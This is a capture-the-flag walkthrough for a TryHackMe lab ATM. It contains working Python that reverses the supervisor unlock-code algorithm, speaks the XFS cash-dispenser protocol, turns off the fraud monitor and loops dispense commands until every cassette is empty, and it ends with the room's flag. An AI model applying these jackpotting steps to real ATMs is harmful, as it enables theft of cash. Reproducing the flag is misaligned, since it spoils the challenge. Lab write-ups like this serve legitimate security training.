# TryHackMe: Jackpot — Walkthrough

An exposed ATM maintenance interface running the XFS protocol — no real authentication, just a hash to reverse and a fraud monitor to silence. The goal: drain all four cassettes and retrieve the flag.

## Recon

I started with an nmap scan against the lab IP and found two open ports: **8080** (HTTP) and **9100** (TCP). Port 8080 hosted a simple web console for the ATM — Earth’s National Bank, Terminal 004. It served a handful of utility binaries and a basic status page but no meaningful authentication surface.

Port 9100 was more interesting. Connecting via netcat immediately returned a 455-byte ASCII banner identifying the service as an XFS (eXtensions for Financial Services) CDM interface — the standard protocol ATMs use to talk to their cash dispenser hardware.

I reverse-engineered the framing by watching what the binary tools sent over the wire. The request format is:

```
1 byte  msg_type
4 bytes command ID (big-endian)
2 bytes payload length (big-endian)
N bytes payload
```

Replies come back as:

```
2 bytes length (big-endian)
N bytes JSON body
```

The server ignores `msg_type` entirely — it routes only on command ID. Key commands discovered via the CAPABILITIES response:

| Command | ID | Description |
| --- | --- | --- |
| WFS\_CMD\_CDM\_STATUS | 0x301 | Get current machine state |
| WFS\_CMD\_CDM\_ARM | 0x4F0 | Enter supervisor mode |
| WFS\_CMD\_CDM\_SET\_MONITOR | 0x4F1 | Toggle fraud monitor |
| WFS\_CMD\_CDM\_DISPENSE | 0x401 | Dispense notes |
| WFS\_CMD\_CDM\_GET\_FLAG | 0x4FF | Retrieve flag |

## Reversing the ARM Code Algorithm

The ARM command (0x4F0) requires an activation code — a supervisor unlock computed from the machine’s current nonce. The web console exposed a binary called `/jackpot` that takes a 6-digit nonce and prints the correct code. The challenge is replicating that algorithm in Python so I can compute codes on the fly.

I downloaded the binary and disassembled it. The algorithm is FNV-1a 64-bit with a custom post-processing step using the string `ENBANK`:

```python
FNV_OFFSET = 0xcbf29ce484222325
FNV_PRIME  = 0x100000001b3
M64 = (1 << 64) - 1

def arm_code(data: bytes) -> int:
    # FNV-1a over the nonce bytes
    h = FNV_OFFSET
    for b in data:
        h = ((h ^ b) * FNV_PRIME) & M64

    # ENBANK mixing step
    rax = h; rdx = 0x45; enbank = b'ENBANK\x00'; i = 0
    while True:
        rdx = (rdx ^ rax) & M64; i += 1
        rdx = (rdx * FNV_PRIME) & M64
        rax = ((rdx >> 29) ^ rdx) & M64
        if i >= len(enbank) - 1: break
        nx = enbank[i]
        if nx == 0: break
        rdx = nx

    return rax % 100_000_000
```

I verified the implementation against the binary output: nonce `457895` → code `86526428`. Match confirmed. The XFS helper I used throughout:

```python
import socket, struct, json

def xfs(cmd, payload=b'', mtype=0x02):
    s = socket.create_connection(('10.144.151.186', 9100), timeout=15)
    s.recv(4096)  # discard banner
    s.sendall(struct.pack('>BIH', mtype, cmd, len(payload)) + payload)
    r = s.recv(4096); s.close()
    return json.loads(r[2:2+struct.unpack('>H', r[:2])[0]])
```

## Dead Ends Worth Noting

**ARM with JSON payload.** My first instinct was to send `{"code": 86526428}` — a JSON object, the way most of the other commands work. The server returned `WFS_ERR_CDM_INVALIDCODE` on every attempt regardless of how the nonce was encoded. The fix was to send the code as plain ASCII bytes: `b'86526428'`. The ARM command does not speak JSON.

**The `jackpot.pcap` file.** The web console also served a file named `/jackpot.pcap`. The name strongly implied a packet capture with something to replay (the room hints at a “replay” angle). It turned out to be another ELF binary — the same algorithm, slightly different output format. No pcap data anywhere in the file.

**DISPENSE without a transaction ID.** Calling the DISPENSE command with no `transaction_id` field triggered the fraud monitor immediately: `anomalous dispense with null transaction id → machine locked`. The lock lasts 45 seconds and resets the nonce and cassette counts on release.

**SET\_MONITOR with JSON.** After discovering the fraud monitor, I tried disabling it with `{"enable": false}`. The server returned `WFS_SUCCESS` but the follow-up STATUS showed `monitor_on: True` — nothing changed. Several other JSON variants (`{"enabled": false}`, `{"monitor_on": false}`) all failed the same way.

**Fraud monitor re-locking after the second DISPENSE.** Even after including a `transaction_id` in the payload, the monitor locked the machine again on the second dispense call in the same session — same `anomalous dispense with null transaction id` error. The monitor ignores the field and allows exactly one dispense before locking. SET\_MONITOR had to be properly disabled first.

## Key Discoveries

**ARM takes plain ASCII, not JSON.** The ARM command parser expects the raw decimal code as ASCII bytes — the same format the `jackpot` binary prints to stdout. Sending the integer as `b'14249904'` instead of `{"code": 14249904}` was the fix that unlocked supervisor mode.

**SET\_MONITOR takes plain ASCII too.** With the ARM insight in mind, I tried plain-text payloads for SET\_MONITOR. `b'false'` returned success but `monitor_on` stayed `True`. `b'0'` worked: the server flipped the monitor off and the follow-up STATUS confirmed `monitor_on: False`. The full working sequence to arm and disable the monitor:

```python
# Get current nonce and compute code
st = xfs(0x301, mtype=0x01)['status']
nonce = st['nonce']
code = arm_code(nonce.encode())

# ARM with plain ASCII bytes
xfs(0x4f0, str(code).encode())   # WFS_SUCCESS

# Disable fraud monitor with plain ASCII
xfs(0x4f1, b'0')                  # monitor_on: False
```

## Draining the Cassettes

With the fraud monitor off and the terminal armed, I queried STATUS and found four cassettes loaded:

| Cassette | Denomination | Notes |
| --- | --- | --- |
| CST1 | $10 | 100 |
| CST2 | $20 | 80 |
| CST3 | $50 | 60 |
| CST4 | $100 | 40 |

280 total notes, $14,000 in the machine. The DISPENSE command accepts JSON with `cassette_id`, `count`, and `transaction_id`, but silently caps each call at 40 notes regardless of how many are requested. I looped until every cassette read 0:

```python
txn = 0
while True:
    st = xfs(0x301, mtype=0x01)['status']
    cassettes = st['cassettes']  # list, not dict
    if sum(c['count'] for c in cassettes) == 0:
        break
    for cst in cassettes:
        if cst['count'] > 0:
            txn += 1
            count = min(cst['count'], 40)
            payload = json.dumps({
                'cassette_id': cst['id'],
                'count': count,
                'transaction_id': f'TXN{txn:04d}'
            }).encode()
            xfs(0x401, payload)
```

The loop ran three iterations before `remaining_notes` hit 0 across all four cassettes.

## Flag

Once all cassettes hit 0, `WFS_CMD_CDM_GET_FLAG` (0x4FF) returned:

```
THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}
```

The room name says it all — the machine was designed to empty itself if you spoke to it in the right voice.
